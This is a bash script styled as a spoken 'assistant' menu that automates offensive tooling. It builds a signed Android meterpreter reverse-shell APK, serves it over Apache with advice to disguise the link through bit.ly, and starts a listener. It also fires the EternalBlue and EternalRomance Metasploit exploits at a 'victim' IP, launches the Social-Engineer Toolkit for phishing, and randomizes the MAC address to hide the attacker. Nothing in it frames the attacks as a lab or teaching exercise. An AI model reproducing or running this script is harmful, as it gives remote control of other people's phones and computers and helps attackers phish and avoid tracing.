#!/bin/bash/

clear

payloadSaveSlot1=""
payloadSaveSlot2=""
outfile="android_shell.apk"

h=`date +%H`

if [ $h -lt 12 ]; then
  espeak "Good morning, sir"
elif [ $h -lt 18 ]; then
  espeak "Good afternoon sir"
else
  espeak "Good evening sir"
fi

echo ""
echo "1. Start Metasploit"
echo "2. AutoPwnr"
echo "3. Randomize my mac address"

espeak "What can I help you with"
echo ""
echo -ne "Choose a number: "
read choiceOne

if [ $choiceOne = 1 ]; then
  espeak "Initializing Metasploit Framework"
  sudo service postgresql start
  msfconsole
elif [ $choiceOne = 2 ]; then
clear
echo ""
echo "1. Hack an Android phone"
echo "2. Go Phishing"
echo "3. FuzzBunch attacks"

espeak "Here's what I can do for you."
echo ""
echo -ne "Choose a number: "
read choiceTwo
  if [ $choiceTwo = 1 ]; then
    clear
    echo -ne "Enter your IP address: "
    read ip
    echo -ne "Enter port: "
    read port
    echo -ne "Enter output file name(*.apk): "
    read finalOutFile
    espeak "Creating android payload"
    export PATH="$HOME/Documents/OpenJDK/jdk-15.0.2/bin:$PATH"
    sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R> $outfile
    keytool -genkey -V -keystore key.keystore -alias hacked -keyalg RSA -keysize 2048 -validity 10000
    jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key.keystore $outfile hacked
    jarsigner -verify -verbose -certs $outfile
    zipalign -v 4 $outfile $finalOutFile
    espeak "payload created"
    sleep 1
    espeak "Copying file to apache fileserver"
    sudo cp $finalOutFile /var/www/html/$finalOutFile
    sudo rm -r $finalOutFile
    sleep 1
    espeak "Starting apache fileserver"
    sudo service apache2 start
    espeak "fileserver initialized"
    echo "apache serving at $ip/$finalOutFile, use bit.ly to shorten the ip"
    read holdread
    espeak "initializing metasploit framework"
    sudo service postgresql start
    msfconsole -x "use multi/handler;set payload android/meterpreter/reverse_tcp;set lhost $ip;set lport $port;run"
  elif [ $choiceTwo = 2 ]; then
    sudo setoolkit
  elif [ $choiceTwo = 3 ]; then
    clear
    echo "1. Eternal Blue"
    echo "2. Eternal Romance"
    printf "\n\n\n"
    echo -ne "Choose a number: "
    read fuzzBunchChoice

    if [ $fuzzBunchChoice == 1 ]; then
      espeak "Initializing Metasploit Framework"
      service postgresql start
      sleep 2
      echo -ne "Enter victims IP address: "
      read victimIp
      echo -ne "Enter your IP address: "
      read ip
      echo -ne "Enter port: "
      read port
      espeak "configuring attack and sending payload to victim PC"
      msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue;set rhost $victimIp;set rport 4444;set payload windows/x64/meterpreter/reverse_tcp;set lhost $ip;set lport $port;run"
    elif [ $fuzzBunchChoice == 2 ]; then
      espeak "Initializing Metasploit Framework"
      service postgresql start
      sleep 2
      echo -ne "Enter victims IP address: "
      read victimIp
      echo -ne "Enter your IP address: "
      read ip
      echo -ne "Enter port: "
      read port
      espeak "configuring attack and sending payload to victim PC"
      msfconsole -x "use exploit/windows/smb/ms17_010_psexec;set rhosts $victimIp;set payload windows/x64/meterpreter/reverse_tcp;set lhost $ip;set lport $port;run"
    else 
      :
    fi

  else
    espeak "This option is not valid"
    echo "Option invalid"
  fi
elif [ $choiceOne = 3 ]; then
  espeak "initializing mac address randomization"
  sudo service NetworkManager stop
  sudo ifconfig wlan0 down
  sleep 1
  sudo macchanger -r wlan0
  sleep 1
  sudo ifconfig wlan0 up
  sudo service NetworkManager start
  espeak "mac address randomized"
else
  :
fi
